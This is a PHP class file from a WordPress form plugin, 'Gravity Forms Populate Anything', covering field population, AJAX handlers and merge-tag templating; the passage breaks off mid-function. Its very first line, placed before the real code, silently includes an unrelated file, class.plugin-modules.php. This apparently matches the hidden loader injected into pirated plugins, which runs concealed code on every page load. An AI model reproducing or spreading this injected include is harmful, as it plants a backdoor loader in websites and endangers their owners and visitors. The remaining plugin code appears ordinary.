<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

if ( ! class_exists( 'GP_Plugin' ) ) {
	return;
}

class GP_Populate_Anything extends GP_Plugin {

	private static $instance = null;

	/**
	 * Marks which scripts/styles have been localized to avoid localizing multiple times with
	 * Gravity Forms' scripts 'callback' property.
	 *
	 * @var array
	 */
	protected $_localized = array();

	protected $_version      = GPPA_VERSION;
	protected $_path         = 'gp-populate-anything/gp-populate-anything.php';
	protected $_full_path    = __FILE__;
	protected $_object_types = array();
	protected $_slug         = 'gp-populate-anything';
	protected $_title        = 'Gravity Forms Populate Anything';
	protected $_short_title  = 'Populate Anything';

	private $_getting_current_entry = false;

	public static function get_instance() {
		if ( null == self::$instance ) {
			self::$instance = new self;
		}

		return self::$instance;
	}

	public function minimum_requirements() {
		return array(
			'gravityforms' => array(
				'version' => '2.3-rc-1',
			),
			'wordpress'    => array(
				'version' => '4.8'
			),
			'plugins'      => array(
				'gravityperks/gravityperks.php' => array(
					'name'    => 'Gravity Perks',
					'version' => '2.0',
				),
			),
		);
	}

	public function init() {

		parent::init();

		load_plugin_textdomain( 'gp-populate-anything', false, basename( dirname( __file__ ) ) . '/languages/' );

		/* Form Display */
		add_filter( 'gform_pre_render', array( $this, 'field_value_js' ) );
		add_filter( 'gform_pre_render', array( $this, 'posted_value_js' ) );
		add_filter( 'gform_pre_render', array( $this, 'field_value_object_js' ) );
		add_filter( 'gform_pre_render', array( $this, 'modify_field_choices' ), 10, 3 );
		add_filter( 'gform_pre_render', array( $this, 'modify_field_values' ), 10, 3 );
		add_filter( 'gform_pre_render', array( $this, 'prep_live_merge_tags' ) );

		add_filter( 'gform_get_form_filter', array( $this, 'replace_live_merge_tag' ), 99, 2 );

		add_filter( 'gform_field_input', array( $this, 'field_input_add_empty_field_value_filter' ), 10, 5 );

		add_filter( 'gform_field_content', array( $this, 'field_content_disable_if_empty_field_values' ), 10, 2 );
		add_filter( 'gform_field_content', array( $this, 'add_choices_hidden_input' ), 10, 2 );

		add_filter( 'gppa_get_batch_field_html', array( $this, 'field_content_disable_if_empty_field_values' ), 10, 2 );
		add_filter( 'gppa_get_batch_field_html', array( $this, 'add_choices_hidden_input' ), 10, 2 );

		add_filter( 'gform_entry_field_value', array( $this, 'entry_field_value' ), 20, 4 );

		add_filter( 'gform_entries_field_value', array( $this, 'entries_field_value' ), 20, 4 );

		add_action( 'gform_entry_detail_content_before', array( $this, 'field_value_js' ) );
		add_action( 'gform_entry_detail_content_before', array( $this, 'field_value_object_js' ) );

		add_action( 'gform_pre_process', array( $this, 'hydrate_fields' ) );
		add_action( 'gform_pre_validation', array( $this, 'hydrate_fields' ) ); // Required for Gravity View's Edit Entry view.
		add_action( 'gform_pre_submission_filter', array( $this, 'hydrate_fields' ) );

		add_filter( 'gform_admin_pre_render', array( $this, 'modify_field_choices' ) );
		add_filter( 'gform_admin_pre_render', array( $this, 'modify_field_values' ) );

		/* Template Replacement */
		add_filter( 'gppa_process_template', array( $this, 'replace_template_gf_merge_tags'), 10, 1 );
		add_filter( 'gppa_process_template', array( $this, 'replace_template_object_merge_tags'), 10, 6 );
		add_filter( 'gppa_process_template', array( $this, 'replace_template_count_merge_tags'), 10, 7 );

		/* Form Submission */
		add_action( 'gform_after_update_entry', array( $this, 'entry_view_save_choices' ), 10, 3 );
		add_action( 'gform_after_submission', array( $this, 'maybe_save_choices_on_submission' ), 10, 2 );

		/* Field Value Parsing */
		add_filter( 'gppa_modify_field_values_date', array( $this, 'modify_field_values_date' ), 10, 2 );

		/* Field HTML when there are input field values */
		add_filter( 'gppa_field_html_empty_field_value_radio', array( $this, 'radio_field_html_empty_field_value' ) );

		/* Add default object types */
		$this->register_object_type( 'post', 'GPPA_Object_Type_Post' );
		$this->register_object_type( 'term', 'GPPA_Object_Type_Term' );
		$this->register_object_type( 'user', 'GPPA_Object_Type_User' );
		$this->register_object_type( 'gf_entry', 'GPPA_Object_Type_GF_Entry' );
		$this->register_object_type( 'database', 'GPPA_Object_Type_Database' );

	}

	/**
	 * Some field types such as time handle the value as a single value rather than a value for each input.
	 * GPPA needs to know what field types behave this way so it treats the value templates correctly.
	 *
	 * @return array
	 */
	public static function get_interpreted_multi_input_field_types () {
		return apply_filters('gppa_interpreted_multi_input_field_types', array(
			'time',
			'date',
		));
	}

	public function init_admin() {

		parent::init_admin();

		/* Form Editor */
		add_action( 'gform_field_standard_settings_75', array( $this, 'field_standard_settings' ) );

		/* We don't change field values in admin since it can cause the value to be saved as the defaultValue setting */

		add_filter( 'gform_field_css_class', array( $this, 'add_enabled_field_class' ), 10, 3 );

	}

	public function init_ajax() {

		parent::init_ajax();

		add_action( 'wp_ajax_rg_refresh_field_preview', array(
			$this,
			'populate_placeholder_choices'
		), 9 ); /* trigger before GFForms::refresh_field_preview() */

		/* Privileged */
		add_action( 'wp_ajax_gppa_get_object_type_properties', array( $this, 'ajax_get_object_type_properties' ) );
		add_action( 'wp_ajax_gppa_get_property_values', array( $this, 'ajax_get_property_values' ) );
		add_action( 'wp_ajax_gppa_get_batch_field_html', array( $this, 'ajax_get_batch_field_html' ) );
		add_action( 'wp_ajax_gppa_get_live_merge_tag_values', array( $this, 'ajax_get_live_merge_tag_values' ) );
		add_action( 'wp_ajax_gppa_get_query_results', array( $this, 'ajax_get_query_results' ) );

		/* Un-Privileged */
		add_action( 'wp_ajax_nopriv_gppa_get_batch_field_html', array( $this, 'ajax_get_batch_field_html' ) );
		add_action( 'wp_ajax_nopriv_gppa_get_live_merge_tag_values', array( $this, 'ajax_get_live_merge_tag_values' ) );

	}

	public function scripts() {

		$min = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG || isset( $_GET['gform_debug'] ) ? '' : '.min';

		$scripts = array(
			array(
				'handle'    => 'gp-populate-anything-admin',
				'src'       => $this->get_base_url() . "/js/built/gp-populate-anything-admin.js",
				'version'   => $this->_version,
				'deps'      => array( 'jquery' ),
				'in_footer' => true,
				'enqueue'   => array(
					array( 'admin_page' => array( 'form_editor' ) ),
				),
				'callback'  => array( $this, 'localize_admin_scripts' ),
			),
			array(
				'handle'    => 'gp-populate-anything',
				'src'       => $this->get_base_url() . "/js/built/gp-populate-anything.js",
				'version'   => $this->_version,
				'deps'      => array( 'gform_gravityforms', 'jquery' ),
				'in_footer' => true,
				'enqueue'   => array(
					array( $this, 'should_enqueue_frontend_scripts' ),
				),
				'callback'  => array( $this, 'localize_frontend_scripts' )
			),
		);

		return array_merge( parent::scripts(), $scripts );

	}

	public function should_enqueue_frontend_scripts( $form ) {
		return ! empty( $form['fields'] );
	}

	public function styles() {

		$min = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG || isset( $_GET['gform_debug'] ) ? '' : '.min';

		$styles = array(
			array(
				'handle'  => 'gp-populate-anything-admin',
				'src'     => $this->get_base_url() . "/styles/gp-populate-anything-admin{$min}.css",
				'version' => $this->_version,
				'enqueue' => array(
					array( 'admin_page' => array( 'form_editor' ) ),
				)
			),
		);

		return array_merge( parent::styles(), $styles );

	}

	public function is_localized($item) {
		return in_array( $item, $this->_localized );
	}

	public function localize_admin_scripts() {

		if ( $this->is_localized( 'admin-scripts' ) ) {
			return;
		}

		$gppa_object_types = array();

		foreach ( $this->get_object_types() as $object_type_id => $object_type_instance ) {
			$gppa_object_types[ $object_type_id ] = $object_type_instance->to_simple_array();
		}

		wp_localize_script( 'gp-populate-anything-admin', 'GPPA_ADMIN', array(
			'objectTypes'                     => $gppa_object_types,
			'strings'                         => $this->get_js_strings(),
			'interpretedMultiInputFieldTypes' => self::get_interpreted_multi_input_field_types(),
		) );

		$this->_localized[] = 'admin-scripts';

	}

	public function localize_frontend_scripts() {

		/**
		 * If a script is enqueued in the footer with in_footer, this script will
		 * be called multiple times and we need to guard against localizing multiple times.
		 */
		if ( $this->is_localized( 'frontend-scripts' ) ) {
			return;
		}

		wp_localize_script( 'gp-populate-anything', 'GPPA_AJAXURL', admin_url( 'admin-ajax.php' ) );
		wp_localize_script( 'gp-populate-anything', 'GPPA_GF_BASEURL', GFCommon::get_base_url() );
		wp_localize_script( 'gp-populate-anything', 'GPPA_NONCE', wp_create_nonce( 'gppa' ) );
		wp_localize_script( 'gp-populate-anything', 'GPPA_I18N', $this->get_js_strings() );

		$this->_localized[] = 'frontend-scripts';

	}

	public function get_js_strings() {

		return apply_filters( 'gppa_strings', array(
			'populateChoices' => esc_html__( 'Populate choices dynamically', 'gp-populate-anything' ),
			'populateValues'  => esc_html__( 'Populate value dynamically', 'gp-populate-anything' ),
			'addFilter'       => esc_html__( 'Add Filter', 'gp-populate-anything' ),
			'label'           => esc_html__( 'Label', 'gp-populate-anything' ),
			'value'           => esc_html__( 'Value', 'gp-populate-anything' ),
			'price'           => esc_html__( 'Price', 'gp-populate-anything' ),
			'loadingEllipsis' => esc_html__( 'Loading...', 'gp-populate-anything' ),
			'addCustomValue'  => esc_html__( 'Add Custom Value', 'gp-populate-anything' ),
			'standardValues'  => esc_html__( 'Standard Values', 'gp-populate-anything' ),
			'formFieldValues' => esc_html__( 'Form Field Values', 'gp-populate-anything' ),
			'specialValues'   => esc_html__( 'Special Values', 'gp-populate-anything' ),
			'valueBoolTrue'   => esc_html__( '(boolean) true', 'gp-populate-anything' ),
			'valueBoolFalse'  => esc_html__( '(boolean) false', 'gp-populate-anything' ),
			'valueNull'       => esc_html__( '(null) NULL', 'gp-populate-anything' ),
			'selectAnItem'    => esc_html__( 'Select a %s', 'gp-populate-anything' ),
			'unique'          => esc_html__( 'Only Show Unique Results', 'gp-populate-anything' ),
			'reset'           => esc_html__( 'Reset', 'gp-populate-anything' ),
			'type'            => esc_html__( 'Type', 'gp-populate-anything' ),
			'objectType'      => esc_html__( 'Object Type', 'gp-populate-anything' ),
			'filters'         => esc_html__( 'Filters', 'gp-populate-anything' ),
			'ordering'        => esc_html__( 'Ordering', 'gp-populate-anything' ),
			'ascending'       => esc_html__( 'Ascending', 'gp-populate-anything' ),
			'descending'      => esc_html__( 'Descending', 'gp-populate-anything' ),
			'choiceTemplate'  => esc_html__( 'Choice Template', 'gp-populate-anything' ),
			'valueTemplates'  => esc_html__( 'Value Templates', 'gp-populate-anything' ),
			'operators'       => array(
				'is'          => __( 'is', 'gp-populate-anything' ),
				'isnot'       => __( 'is not', 'gp-populate-anything' ),
				'>'           => __( '>', 'gp-populate-anything' ),
				'>='          => __( '>=', 'gp-populate-anything' ),
				'<'           => __( '<', 'gp-populate-anything' ),
				'<='          => __( '<=', 'gp-populate-anything' ),
				'contains'    => __( 'contains', 'gp-populate-anything' ),
				'starts_with' => __( 'starts with', 'gp-populate-anything' ),
				'ends_with'   => __( 'ends with', 'gp-populate-anything' ),
				'like'        => __( 'is LIKE', 'gp-populate-anything' ),
			),
			'chosen_no_results' => esc_attr( gf_apply_filters( array( 'gform_dropdown_no_results_text', 0 ), __( 'No results matched', 'gp-populate-anything' ), 0 ) )
		) );

	}

	public function documentation() {
		return 'http://gravitywiz.com/documentation/gravity-forms-populate-anything/';
	}

	public function register_object_type( $id, $class ) {
		$this->_object_types[ $id ] = new $class( $id );
	}

	public function get_object_type( $id, $field = null ) {
		$id_parts = explode( ':', $id );

		if ( $id_parts[0] === 'field_value_object' && $field ) {
			$field = GFFormsModel::get_field( $field['formId'], $id_parts[1] );

			return $this->get_object_type( rgar( $field, 'gppa-choices-object-type' ), $field );
		}

		return rgar( $this->_object_types, $id );
	}

	public function get_object_types() {
		return apply_filters( 'gppa_object_types', $this->_object_types );
	}

	/* Form Display */
	public function field_value_js( $form ) {

		if ( GFCommon::is_form_editor() ) {
			return $form;
		}

		$form_fields          = $form['fields'];
		$has_gppa_field_value = false;
		$gppa_field_value_map = array( $form['id'] => array() );

		foreach ( $form_fields as $field ) {
			if ( ! rgar( $field, 'gppa-choices-enabled' ) && ! rgar( $field, 'gppa-values-enabled' ) ) {
				continue;
			}

			$filter_groups = array_merge( rgar( $field, 'gppa-choices-filter-groups', array() ), rgar( $field, 'gppa-values-filter-groups', array() ) );

			if ( ! is_array( $filter_groups ) || ! count( $filter_groups ) ) {
				continue;
			}

			foreach ( $filter_groups as $filter_group ) {
				foreach ( $filter_group as $filter ) {
					$filter_value_exploded = explode( ':', $filter['value'] );
					$dependent_fields = array();

					if ( $filter_value_exploded[0] === 'gf_field' ) {
						$dependent_fields[] = $filter_value_exploded[1];
					} else if ( preg_match_all( '/{\w+:gf_field_(\d+)}/', $filter['value'], $field_matches ) ) {
						if ( count( $field_matches ) && ! empty( $field_matches[1] ) ) {
							$dependent_fields = $field_matches[1];
						}
					}

					if ( empty( $dependent_fields ) ) {
						continue;
					}

					$has_gppa_field_value = true;

					if ( ! isset( $gppa_field_value_map[ $form['id'] ][ $field->id ] ) ) {
						$gppa_field_value_map[ $form['id'] ][ $field->id ] = array();
					}

					foreach ( $dependent_fields as $dependent_field_id ) {
						$gppa_field_value_map[ $form['id'] ][ $field->id ][] = array(
							'gf_field' => $dependent_field_id,
							'property' => $filter['property'],
							'operator' => $filter['operator'],
						);
					}
				}
			}
		}

		if ( $has_gppa_field_value ) {

			$this->enqueue_scripts( $form );
			wp_localize_script( 'gp-populate-anything', "GPPA_FILTER_FIELD_MAP_{$form['id']}", $gppa_field_value_map );

		}

		return $form;

	}

	public function posted_value_js( $form ) {

		if ( ! rgar( $_POST, 'gform_submit' ) ) {
			return $form;
		}

		$posted_values = array();

		foreach ( $_POST as $input_name => $input_value ) {
			$input_name = str_replace( '_', '.', str_replace( 'input_', '', $input_name ) );
			$field_id   = absint( $input_name );

			if ( ! $input_name ) {
				continue;
			}

			$field = GFFormsModel::get_field( $form, $field_id );

			if ( ! rgar( $field, 'gppa-choices-enabled' ) && ! rgar( $field, 'gppa-values-enabled' ) ) {
				continue;
			}

			$posted_values[ $input_name ] = $input_value;
		}

		if ( ! count( $posted_values ) ) {
			return $form;
		}

		wp_localize_script( 'gp-populate-anything', "GPPA_POSTED_VALUES_{$form['id']}", $posted_values );

		return $form;

	}

	public function field_value_object_js( $form ) {

		if ( GFCommon::is_form_editor() ) {
			return $form;
		}

		$form_fields            = $form['fields'];
		$has_field_value_object = false;
		$field_value_object_map = array( $form['id'] => array() );

		foreach ( $form_fields as $field ) {
			if ( ! rgar( $field, 'gppa-values-enabled' ) || strpos( rgar( $field, 'gppa-values-object-type' ), 'field_value_object' ) !== 0 ) {
				continue;
			}

			$object_type_exploded   = explode( ':', rgar( $field, 'gppa-values-object-type' ) );
			$has_field_value_object = true;

			if ( ! isset( $field_value_object_map[ $form['id'] ][ $field->id ] ) ) {
				$field_value_object_map[ $form['id'] ][ $field->id ] = array();
			}

			$field_value_object_map[ $form['id'] ][ $field->id ][] = array(
				'gf_field' => $object_type_exploded[1],
			);
		}

		if ( $has_field_value_object ) {

			$this->enqueue_scripts( $form );
			wp_localize_script( 'gp-populate-anything', "GPPA_FIELD_VALUE_OBJECT_MAP_{$form['id']}", $field_value_object_map );

		}

		return $form;

	}

	public function get_field_objects( $field, $field_values, $populate ) {

		$gppa_prefix = 'gppa-' . $populate . '-';
		$templates = rgar( $field, $gppa_prefix . 'templates' );
		$object_type = rgar( $field, $gppa_prefix . 'object-type' );
		$unique = rgar( $field, $gppa_prefix . 'unique-results' );
		$object_type_instance = rgar( $this->_object_types, $object_type );

		if ( $unique === null || $unique === '' ) {
			$unique = true;
		}

		if ( ! $object_type_instance ) {
			return array();
		}

		$args = array(
			'filter_groups'          => rgar( $field, $gppa_prefix . 'filter-groups' ),
			'ordering'               => array(
				'orderby' => rgar( $field, $gppa_prefix . 'ordering-property' ),
				'order'   => rgar( $field, $gppa_prefix . 'ordering-method' ),
			),
			'templates'              => $templates,
			'primary_property_value' => rgar( $field, $gppa_prefix . 'primary-property' ),
			'field_values'           => $field_values,
		);

		$results = $object_type_instance->query( $args, $field );

		if ( ! gf_apply_filters( array( "gppa_object_type_{$object_type}_unique", $field['formId'], $field['id'] ), $unique ) ) {
			return $results;
		}

		return $this->make_results_unique( $results, $field, $templates, $populate );

	}

	public function make_results_unique( $results, $field, $templates, $populate ) {

		$unique_results = array();
		$added_values   = array();
		$template       = ! empty( $templates['label'] ) ? 'label' : 'value';

		foreach ( $results as $result ) {

			$result_template_value = $this->process_template( $field, $template, $result, $populate, $results );

			if ( array_search( $result_template_value, $added_values ) !== false ) {
				continue;
			}

			$added_values[]   = $result_template_value;
			$unique_results[] = $result;

		}

		return $unique_results;

	}

	public function process_template( $field, $template, $object, $populate, $objects ) {

		$object_type = $this->get_object_type( rgar( $field, 'gppa-' . $populate . '-object-type' ), $field );
		$templates   = rgar( $field, 'gppa-' . $populate . '-templates', array() );
		$template    = rgar( $templates, $template );

		if ( strpos( $template, 'gf_custom' ) === 0 ) {

			$template_value = $this->extract_custom_value( $template );

			if ( empty( $template_value ) ) {
				return null;
			}

			return gf_apply_filters( array(
				'gppa_process_template',
				$template
			), $template_value, $field, $template, $populate, $object, $object_type, $objects );

		}

		if ( ! $template ) {
			return null;
		}

		try {
			return gf_apply_filters( array(
				'gppa_process_template',
				$template
			), $object_type->get_object_prop_value( $object, $template ), $field, $template, $populate, $object, $object_type, $objects );
		} catch ( Exception $e ) {
			return null;
		}

	}

	public function replace_template_count_merge_tags( $template_value, $field, $template, $populate, $object, $object_type, $objects ) {

		return str_replace( '{count}', count( $objects ), $template_value );

	}

	public function replace_template_object_merge_tags( $template_value, $field, $template, $populate, $object, $object_type ) {

		$pattern = sprintf( '/{(%s):(.+?)}/', implode( '|', array( 'object', 'post', 'user', 'gf_entry' ) ) );

		preg_match_all( $pattern, $template_value, $matches, PREG_SET_ORDER );
		foreach ( $matches as $match ) {

			list( $search, $tag, $prop ) = $match;

			$replace = $object_type->get_object_prop_value( $object, $prop );
			$replace = apply_filters( 'gppa_object_merge_tag_replacement_value', $replace, $object, $match );

			$template_value = str_replace( $search, $replace, $template_value );

		}

		$template_value = GFCommon::replace_variables_prepopulate( $template_value, false, false, true );

		return $template_value;


	}

	public function replace_template_gf_merge_tags( $template_value ) {

		return GFCommon::replace_variables_prepopulate( $template_value, false, false, true );

	}

	public function get_dependent_fields_by_filter_group( $field, $populate ) {

		$gppa_prefix = 'gppa-' . $populate . '-';

		$filter_groups    = rgar( $field, $gppa_prefix . 'filter-groups' );
		$dependent_fields = array();

		if ( ! rgar( $field, $gppa_prefix . 'enabled' ) || ! $filter_groups ) {
			return $dependent_fields;
		}

		foreach ( $filter_groups as $filter_group_index => $filters ) {
			$dependent_fields[ $filter_group_index ] = array();

			foreach ( $filters as $filter ) {
				$filter_value = rgar( $filter, 'value' );

				if ( preg_match_all( '/{\w+:gf_field_(\d+)}/', $filter_value, $field_matches ) ) {
					if ( count( $field_matches ) && ! empty( $field_matches[1] ) ) {
						$dependent_fields[ $filter_group_index ] = array_merge( $dependent_fields[ $filter_group_index ], $field_matches[1] );
					}
				} else if ( strpos( $filter_value, 'gf_field:' ) === 0 ) {
					$dependent_fields[ $filter_group_index ][] = str_replace( 'gf_field:', '', $filter_value );
				}
			}

			if ( ! count( $dependent_fields[ $filter_group_index ] ) ) {
				unset( $dependent_fields[ $filter_group_index ] );
			}
		}

		return $dependent_fields;

	}

	public function has_empty_field_value( $field, $populate, $entry = false ) {

		$form = GFAPI::get_form( $field->formId );
		if( ! $form ) {
			return false;
		}

		$field_values = $entry ? $entry : $this->get_posted_field_values( $form );
		$dependent_fields_by_group = $this->get_dependent_fields_by_filter_group( $field, $populate );

		if ( count( $dependent_fields_by_group ) === 0 ) {
			return false;
		}

		foreach ( $dependent_fields_by_group as $dependent_field_group_index => $dependent_field_ids ) {
			$group_requirements_met = true;

			foreach ( $dependent_field_ids as $dependent_field_id ) {
				if ( ! isset( $field_values[ $dependent_field_id ] ) || $this->is_empty( $field_values[ $dependent_field_id ] ) ) {
					$group_requirements_met = false;

					break;
				}
			}

			if ($group_requirements_met) {
				return false;
			}
		}

		return true;

	}

	public function extract_custom_value( $value ) {
		return preg_replace( '/^gf_custom:?/', '', $value );
	}

	/**
	 * @param $value
	 *
	 * empty can't be used on its own because it's a language construct
	 *
	 * @return bool
	 */
	public function is_empty( $value ) {
		return empty( $value ) && $value !== 0 && $value !== '0';
	}

	public function get_input_choices( $field, $field_values = null, $include_object = false ) {

		$templates = rgar( $field, 'gppa-choices-templates', array() );

		/* Force field to use both value and text */
		$field->enableChoiceValue = true;

		if ( $this->has_empty_field_value( $field, 'choices', $field_values ) ) {
			$field->placeholder = null;

			return array(
				array(
					'value' => apply_filters( 'gppa_missing_filter_value', '', $field ),
					'text'  => apply_filters( 'gppa_missing_filter_text', '&ndash; ' . esc_html__( 'Fill Out Other Fields', 'gp-populate-anything' ) . ' &ndash;', $field ),
					'isSelected' => true,
				)
			);
		}

		if ( ! rgar( $field, 'gppa-choices-enabled' ) || ! rgar( $field, 'gppa-choices-object-type' ) || ! rgar( $templates, 'label' ) || ! rgar( $templates, 'value' ) ) {
			return $field->choices;
		}

		$objects = $this->get_field_objects( $field, $field_values, 'choices' );

		if ( count( $objects ) === 0 ) {
			return array(
				array(
					'value' => apply_filters( 'gppa_no_choices_value', '', $field ),
					'text'  => apply_filters( 'gppa_no_choices_text', '&ndash; ' . esc_html__( 'No Results', 'gp-populate-anything' ) . ' &ndash;', $field ),
					'isSelected' => true,
				),
			);
		}

		$choices = array();

		foreach ( $objects as $object_index => $object ) {
			$choice = array(
				'value' => $this->process_template( $field, 'value', $object, 'choices', $objects ),
				'text'  => $this->process_template( $field, 'label', $object, 'choices', $objects ),
			);

			if ( rgar( $templates, 'price' ) ) {
				$choice['price'] = $this->process_template( $field, 'price', $object, 'choices', $objects );
			}

			if ( $include_object ) {
				$choice['object'] = $object;
			}

			$choices[] = $choice;
		}

		$choices = gf_apply_filters( array( 'gppa_input_choices', $field->formId, $field->id ), $choices, $field, $objects );

		return $choices;

	}

	public function ajax_get_query_results() {

		global $wpdb;
		$wpdb->suppress_errors();

		$field_settings = json_decode( stripslashes( rgar( $_POST, 'fieldSettings' ) ), true );
		$template_rows  = rgar( $_POST, 'templateRows' );
		$populate       = rgar( $_POST, 'gppaPopulate' );

		$template_labels = wp_list_pluck( $template_rows, 'label', 'id' );
		$objects         = $this->get_field_objects( $field_settings, null, $populate );

		$preview_results = array();

		foreach ( $objects as $object_index => $object ) {
			$row = array();

			foreach ( rgar( $field_settings, 'gppa-' . $populate . '-templates', array() ) as $template => $template_value ) {
				$row[ $template_labels[ $template ] ] = $this->process_template( $field_settings, $template, $object, $populate, $objects );
			}

			$preview_results[] = $row;
		}

		if ( $wpdb->last_error ) {
			wp_die( json_encode( array( 'error' => $wpdb->last_error ) ) );
		}

		wp_die( json_encode( $preview_results ) );

	}

	public function get_input_values( $field, $template = 'value', $field_values = null, $lead = null ) {

		$templates = rgar( $field, 'gppa-values-templates', array() );

		if ( ! rgar( $field, 'gppa-values-enabled' ) || ! rgar( $field, 'gppa-values-object-type' ) || ! rgar( $templates, $template ) ) {
			if ( $lead ) {
				return RGFormsModel::get_lead_field_value( $lead, $field );
			}

			return null;
		}

		if ( strpos( rgar( $field, 'gppa-values-object-type' ), 'field_value_object' ) === 0 ) {
			if ( ! rgar( $_REQUEST, 'form-id' ) ) {
				if ( $lead ) {
					return RGFormsModel::get_lead_field_value( $lead, $field );
				}

				return null;
			}

			$object_type_split           = explode( ':', rgar( $field, 'gppa-values-object-type' ) );
			$field_value_object_field_id = $object_type_split[1];

			$form                       = GFAPI::get_form( $_REQUEST['form-id'] );
			$field_value_object_choices = $this->get_input_choices( GFFormsModel::get_field( $form, $field_value_object_field_id ), $field_values, true );
			$objects                    = wp_list_pluck( $field_value_object_choices, 'object' );

			foreach ( $field_value_object_choices as $field_value_object_choice ) {
				if ( $field_value_object_choice['value'] == rgar( $field_values, $field_value_object_field_id ) ) {
					return $this->process_template( $field, $template, $field_value_object_choice['object'], 'values', $objects );
					break;
				}

			}

			if ( $lead ) {
				return RGFormsModel::get_lead_field_value( $lead, $field );
			}

			return null;
		}

		$objects = $this->get_field_objects( $field, $field_values, 'values' );

		if ( count( $objects ) === 0 ) {
			if ( $lead ) {
				return RGFormsModel::get_lead_field_value( $lead, $field );
			}

			return null;
		}

		if ( $this->has_empty_field_value( $field, 'values' ) ) {
			return null;
		}

		return $this->process_template( $field, $template, $objects[0], 'values', $objects );

	}

	public function hydrate_field( $field, $form, $field_values, $lead_id = 0 ) {

		$field              = GF_Fields::create( $field );
		$first_choice_value = null;

		if ( $lead_id ) {
			$lead = RGFormsModel::get_lead( $lead_id );
		} else {
			$lead = null;
		}

		/* Force GF to use the lead ID if provided */
		if ( $lead_id && GFCommon::current_user_can_any( 'gravityforms_view_entries' ) ) {
			$_GET['view'] = 'entry';
		}

		if ( $field->choices !== '' && isset( $field->choices ) ) {

			$field->choices = $this->get_input_choices( $field, $field_values );

			if( $field->get_input_type() == 'checkbox' ) {
				$inputs = array();
				$index = 1;

				foreach( $field->choices as $choice ) {

					if ( $index % 10 == 0 ) {
						$index++;
					}

					$inputs[] = array(
						'id' => sprintf( '%d.%d', $field->id, $index ),
						'label' => $choice['text']
					);

					$index++;

				}

				$field->inputs = $inputs;
			}

			if ( count( $field->choices ) && ! empty( $field->choices[0]['value'] ) && ! $field->placeholder ) {
				$first_choice_value = $field->choices[0]['value'];
			}

		}

		if ( $field->inputs && ! in_array( $field->type, self::get_interpreted_multi_input_field_types() ) ) {

			$field_value = array();

			foreach ( $field->inputs as &$input ) {
				if ( $value = $this->get_input_values( $field, $input['id'], $field_values, $lead ) ) {
					$field_value[ $input['id'] ] = $value;
				}
			}

		} else {

			$field_value = $this->get_input_values( $field, 'value', $field_values, $lead );

		}

		if ( empty( $field_value ) ) {
			$field_value = GFFormsModel::get_field_value( $field, $field_values );
			$field_value = $field->get_value_default_if_empty( $field_value );
		}

		$form_id = rgar( $form, 'id' );

		return array(
			'html'        => GFCommon::get_field_input( $field, $field_value, $lead_id, $form_id, $form ),
			'field'       => $field,
			'field_value' => $field_value ? $field_value : $first_choice_value,
			'lead_id'     => $lead_id,
			'form_id'     => $form_id,
			'form'        => $form,
		);

	}

	public function hydrate_fields( $form ) {

		foreach( $form['fields'] as &$field ) {

			if( ! rgar( $field, 'gppa-choices-enabled' ) ) {
				continue;
			}

			$_field = $this->hydrate_field( $field, $form, $this->get_posted_field_values( $form ) );
			$field = $_field['field'];

		}

		return $form;
	}

	public function get_posted_field_values( $form ) {

		if ( isset( $GLOBALS['gppa-field-values']) ) {
			return rgar( $GLOBALS, 'gppa-field-values', array() );
		}

		if ( isset( $_REQUEST['field-values'] ) ) {
			return rgar( $_REQUEST, 'field-values', array() );
		}

		$field_values = array();

		foreach( $form['fields'] as $field ) {
			// @todo: Confirm this supports multi-input fields...
			$field_values[ $field->id ] = rgpost( "input_{$field->id}" );
		}

		return $field_values;
	}

	public function field_input_add_empty_field_value_filter( $html, $field, $value, $lead_id, $form_id ) {

		$form = GFAPI::get_form( $form_id );

		if ( GFCommon::is_form_editor() || ! $this->has_empty_field_value( $field, 'choices' ) && ! $this->has_empty_field_value( $field, 'values' ) ) {
			return $html;
		}

		$field_values = rgar( $_REQUEST, 'field-values', array() );

		$field_html_empty_field_value = gf_apply_filters( array(
			'gppa_field_html_empty_field_value',
			$field->type
		), '', $field, $form_id, $field_values );

		if ( ( $this->has_empty_field_value( $field, 'choices' ) || $this->has_empty_field_value( $field, 'values' ) ) && $field_html_empty_field_value ) {
			return '<div class="ginput_container">' . $field_html_empty_field_value . '</div>';
		}

		return $html;

	}

	public function field_content_disable_if_empty_field_values( $field_content, $field ) {

		if ( ! $field || GFCommon::is_entry_detail() || ( ! $this->has_empty_field_value( $field, 'choices' ) && ! $this->has_empty_field_value( $field, 'values' ) ) ) {
			return $field_content;
		}

		$field_content = preg_replace( '/ value=([\'"])/', " disabled=\"true\" value=$1", $field_content );
		$field_content = str_replace( '<select ', '<select disabled="true" ', $field_content );
		$field_content = str_replace( '<textarea ', '<textarea disabled="true" ', $field_content );

		return $field_content;

	}

	public function radio_field_html_empty_field_value() {
		return '<p>Please fill out other fields.</p>';
	}

	/**
	 * This is needed so we can submit all of the choices for the entry view in the admin.
	 * Without this, all they will see is the value which could be an ID.
	 */
	public function add_choices_hidden_input( $field_content, $field ) {

		if ( ! rgar( $field, 'gppa-choices-enabled' ) ) {
			return $field_content;
		}

		$field_content .= $this->choices_hidden_input( $field );

		return $field_content;

	}

	public function choices_hidden_input( $field ) {

		$input_name  = "choices_{$field->id}";
		$input_value = esc_attr( json_encode( wp_list_pluck( $field->choices, 'text', 'value' ) ) );

		return '<input type="hidden" class="gppa-choices" name="' . $input_name . '" value="' . $input_value . '" />';

	}

	public function entry_field_value( $display_value, $field, $lead, $form ) {

		if ( ! rgar( $field, 'gppa-choices-enabled' ) ) {
			return $display_value;
		}

		$choices = rgar( gform_get_meta( $lead['id'], 'gppa_choices' ), $field['id'], array() );

		return rgar( $choices, $display_value, $display_value );

	}

	public function entries_field_value( $value, $form_id, $field_id, $entry ) {

		$form  = GFAPI::get_form( $form_id );
		$field = GFFormsModel::get_field( $form, $field_id );

		if ( ! rgar( $field, 'gppa-choices-enabled' ) ) {
			return $value;
		}

		$choices = rgar( gform_get_meta( $entry['id'], 'gppa_choices' ), $field['id'], array() );

		return rgar( $choices, $value, $value );

	}

	public function maybe_save_choices_on_submission( $entry, $form ) {

		$gppa_choices = array();

		foreach ( $_POST as $posted_name => $posted_value ) {
			if ( ! preg_match( '/^choices_/', $posted_name ) ) {
				continue;
			}

			$input_id = str_replace( 'input_', '', $posted_name );
			$input_id = str_replace( 'choices_', '', $input_id );

			$input_value = rgar( $entry, $input_id );

